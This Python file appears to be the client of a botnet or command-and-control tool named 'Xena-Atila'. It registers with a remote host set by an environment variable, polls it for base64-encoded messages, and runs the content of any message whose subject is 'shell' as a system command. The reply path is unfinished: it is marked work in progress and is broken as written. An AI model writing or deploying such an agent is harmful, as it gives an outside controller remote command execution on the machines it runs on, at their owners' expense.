import json
import logging

from time import sleep
from env import Env
from requests import post, get
from uuid import uuid4
from typing import Union
from base64 import b64decode
from services.system import System

# Unique identifier of this bot instance.
client_id = str(uuid4())

# Message from Atila.
class Message:
  def __init__(self, id: str, from_id: str, to: str, subject: str, content: str, status: str, reply_to: str,):
    self.id = id
    self.from_id = from_id
    self.to = to
    self.subject = subject
    self.content = content
    self.status = status
    self.reply_to = reply_to

  def serialize(self):
    return {
      'id': self.id,
      'from': self.from_id,
      'to': self.to,
      'subject': self.subject,
      'content': self.content,
      'status': self.status,
      'replyTo': self.reply_to,
    }

class XenaAtila:
  def __init__(self):
    logging.debug('Unique identifier at ' + client_id)

    self.remote = Env()['XENA_ATILA_HOST']

    # Identify to the Atila.
    while True:
      try:
        if self.identify(self.remote) == True:
          break
      except Exception as e:
        logging.debug('Unable to identify for ' + self.remote + ' with the error:' + e)
      sleep(10)
    
    logging.debug('Xena-Atila has been successfuly recognized by ' + self.remote)

    # Fetch message loop.
    while True:
      messages = self.read_inbox(self.remote)
      print(messages)
      sleep(10)

  def read_inbox(self, remote_host: str) -> Union[Message, None]:
    messages_response = get(remote_host + '/v1/messages?clientId=' + client_id)

    # No messages for the client.
    if (messages_response.status_code != 200):
      return None

    maybe_messages = json.loads(messages_response.content.decode('utf-8'))

    # Loop over each message.
    for maybe_message in maybe_messages:
      message = Message(
        id = maybe_message['id'],
        from_id = maybe_message['from'],
        to = maybe_message['to'],
        subject = maybe_message['subject'],
        content = maybe_message['content'],
        status = maybe_message['status'],
        reply_to = maybe_message['replyTo'],
      )

      subject = message.subject
      content = b64decode(message.content).decode('utf-8')

      print(subject + ': ' + content)

      # Response message.
      serialized_response: Union[None, str] = None

      if subject == 'shell':
        shell_output = System.do(content)
        
        print('shell output: ' + shell_output)

        # WiP. Issuea the message and go.
        response_message = Message()

  # Make yourself known to the remote host.
  def identify(self, remote_host: str) -> bool:
    response = post(remote_host + '/v1/clients', data = {
      'id': client_id,
      'identificationKey': 'fakekeytemp',
      'status': 'ALIVE',
    })

    # The request has failed. If 409 is returned, means that we're already recognized peer.
    if response.status_code != 200 and response.status_code != 409:
      logging.debug('Identification failed with ' + str(response.status_code) + ' status code for ' + remote_host)
      return False
    
    return True

xena_atila: XenaAtila = XenaAtila()